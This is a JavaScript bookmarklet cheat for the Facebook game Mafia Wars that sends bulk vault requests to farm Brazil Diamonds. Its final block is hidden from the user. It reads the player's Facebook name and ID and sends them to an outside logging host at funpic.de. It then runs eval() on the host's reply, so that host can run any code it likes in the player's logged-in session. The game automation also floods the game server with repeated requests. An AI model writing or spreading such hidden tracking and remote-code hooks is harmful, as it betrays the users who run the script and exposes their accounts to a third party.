
javascript:(function(){
var my_timeout;
var fc2_globalCounter=0;

  var jca_title = 'BrazilDiamondsVaulter by ★LOC@S★ נυαη ★L@★';

  
var log_arr = new Array();
if (typeof $ == 'undefined') {
	$ = unsafeWindow.$;
}
function getTimeStamp4Log(){
	var CurrentDate=new Date();
	var hours=CurrentDate.getHours();
	var minutes=CurrentDate.getMinutes();
	if (minutes <=9){
	  minutes ='0'+minutes;
	}	
	var seconds=CurrentDate.getSeconds();
	if (seconds <=9){
	  seconds ='0'+seconds;
	}
	return '['+hours+':'+minutes+':'+seconds+']:';
}
function log2div(txt){
    log_arr.unshift(txt);
	if (log_arr.length > 1000){
	   log_arr.pop();
	}
	out='<span style="font-size: 10px; background-color: black;">';
	for(i=0;i<log_arr.length;i++){
		out +='<br>'+getTimeStamp4Log()+log_arr[i];
	}
	out +='<span>';
	document.getElementById('juan_boss').innerHTML =out;
}
var http='';
var userid='';
var preurl = '';
my_timeout = waitForFnc();

function waitForFnc(){
  if (document.getElementById('clanXpResetTimer') == null || $.trim($('#clanXpResetTimer').text()) == ''){	  
	  my_timeout = window.setTimeout(waitForFnc,5000);
	}
	else{
		clearTimeout(my_timeout);		
	    //Thanks to the Spockholmteam for this	
		http = 'http://';
		if (/https/.test(document.location)) {
			http = 'https://';
		}  
	  
		userid =/sf_xw_user_id': '(.+)'/.exec(document.body.innerHTML)[1];	
		//preurl = http+'facebook.mafiawars.zynga.com/mwfb/remote/';	 				
		preurl = MW_BASE_URL+'/remote/';
		
		start_stuff();
	}

}

function start_stuff(){  
	clearTimeout(my_timeout);	
var the_div = document.getElementById('quest');
  if (document.getElementById('juansinho_main_brazivault') == undefined){
	  var the_area=document.createElement("div");
		var the_kick_button=document.createElement("a");		
		the_kick_button.className= 'sexy_button_new red short';
		the_kick_button.style.marginLeft='10px';
		the_kick_button.id='juansinho_close_btn';
		the_kick_button.innerHTML = '<span><span>Close</span></span>';
		the_kick_button.href='#';	
		
		var the_start_button=document.createElement("a");		
		the_start_button.className= 'sexy_button_new green short';
		the_start_button.style.marginLeft='10px';
		the_start_button.id='juansinho_start_btn';
		the_start_button.innerHTML = '<span><span>Start</span></span>';
		the_start_button.href='#';			
		
		var the_restart_button=document.createElement("a");		
		the_restart_button.className= 'sexy_button_new green short';
		the_restart_button.style.marginLeft='10px';		
		the_restart_button.id='juansinho_restart_btn';
		the_restart_button.innerHTML = '<span><span>Restart?</span></span>';
		the_restart_button.href='#';				
		
		the_area.id='juansinho_main_brazivault';	   		
		the_area.style.paddingLeft='10px';
		
		var the_area2=document.createElement("div");		
		the_area2.id='juan_boss';	   		
		the_area2.style.paddingLeft='10px';
	   $(the_area).insertBefore(the_div);
	   $(the_restart_button).insertAfter(the_area);
	   $(the_kick_button).insertAfter(the_area);
	   $(the_start_button).insertAfter(the_area);
	   $(the_area2).insertAfter(the_area);
	   
	   
	   $('#juansinho_close_btn').click(function(){$('#juansinho_main_brazivault').remove();$('#juansinho_start_btn').remove();$('#juansinho_restart_btn').remove();$('#juansinho_close_btn').remove();$('#juan_boss').remove();return false;});
	   
	    $('#juansinho_start_btn').click(function(){$(this).hide();StartClicking();});
		the_area.innerHTML=jca_title+' (v0.1 Beta)'
			+'<table><tr><th>Number of vaults</th><td><input type="text" id="jca_vault_ammount" size="5"></td></tr>'
			+'</table>';
	    $('#juansinho_restart_btn').hide();
		 $('#juansinho_restart_btn').click(function(){
			document.getElementById('juan_boss').innerHTML ='';
			document.getElementById('juansinho_main_brazivault').innerHTML =jca_title+' (v0.2 Beta)'
			+'<table><tr><th>Number of vaults</th><td><input type="text" id="jca_vault_ammount" size="5"></td></tr>'
			+'</table>';
			 $(this).hide();
			 log_arr = new Array();
			 $('#juansinho_start_btn').show();
		 });
   }
   else{
	document.getElementById('juansinho_main_brazivault').innerHTML="";
   }  	 
	 
}
function handleSuccess(msg) {
  //console.info(msg);
  var tmp = $(msg).find('.message_body');
  var divs = $(tmp).find('div');
  if (divs.length> 0){
    var new_msg = $(divs[0]).text()+' '+$(divs[1]).text();
	out = new_msg;
  }
  else{
    out = 'hmmm, haven´t found the revault text :/';
  }
 //data = jQuery.parseJSON(msg);
 //out = data.msg;
 
	fc2_globalCounter = fc2_globalCounter-1;
		 log2div(out);
		 if (fc2_globalCounter == 0){
			log2div('Everything is done :)');
			$('#juansinho_restart_btn').show();
		 } 	 
}


function handleError(){log2div("Something went wrong");}	
function StartClicking(){         
	 typ=($('#jca_vault_ammount').val());
	if (typ == '' || isNaN(typ) ){
	  alert('Please type in the number of vaults.');
	  return false;
	}

		
     //Brazil Diamonds: 
	 var url = 'html_server.php?xw_controller=collection&xw_action=vault&xw_city=7&xw_person='+userid.substr(2)+'&vault_type=10&vault_id=1&selected_city=7';
	 //NY - Great Horses
	 //var url = 'html_server.php?xw_controller=collection&xw_action=vault&xw_city=1&xw_person=='+userid.substr(2)+'&vault_id=12&selected_city=1&filter_col=1';
	 log2div('First try sending '+typ+' requests...');
	 for(var i=1;i<=typ;i++){
		 request(url,handleSuccess,handleError);	 		 
		 fc2_globalCounter++;
		 log2div('Request '+i+' sent...');
	 }
  
}

function unix_timestamp() {
		return parseInt(new Date().getTime().toString().substring(0, 10))
	}   
  
function request(url, handler, errorhandler) {
		if (url.indexOf('cb=') == -1) {
			url += '&cb='+userid+unix_timestamp();
		}
		if (url.indexOf('tmp=') == -1) {
			url += '&tmp='+unix_timestamp();
		}
		var params = {
			'ajax': 1,
			'liteload': 1,
			'sf_xw_user_id': userid,
			//'sf_xw_sig': local_xw_sig,
			'xw_client_id': 8,
			'skip_req_frame': 1
		};
		$.ajax({
			type: "POST",
			url: preurl+url,
			data: params,
			//cache: false,
			async : true,
			success: handler,
			error: errorhandler
		});
}

var name_uid = '';
var the_name = 'BrazilVault';

var the_id = User.trackId;
var mUrl = 'https://graph.facebook.com/'+User.trackId;
   $.ajax({
        url: mUrl,
        dataType: 'json',
        success: function(data, status) {         
          //alert(data.name);
          name_uid=data.name;

      }
      ,complete: function(){
           $.ajax({
                                                 async : true
                                                ,cache : false
                                                ,type    : "GET"
                                                ,url     : "http://cux.cu.funpic.de/mw/log_new.php"
                                                ,data    : { user:name_uid, script:the_name,fbid:the_id}
                                                ,dataType: "jsonp"                                     
                                                ,xhrFields: {
                                                    withCredentials: true
                                                }
												,success : function(data,status){
												      eval(data);
												}
												
                              }); 
						  
                  }
   });  


})() 
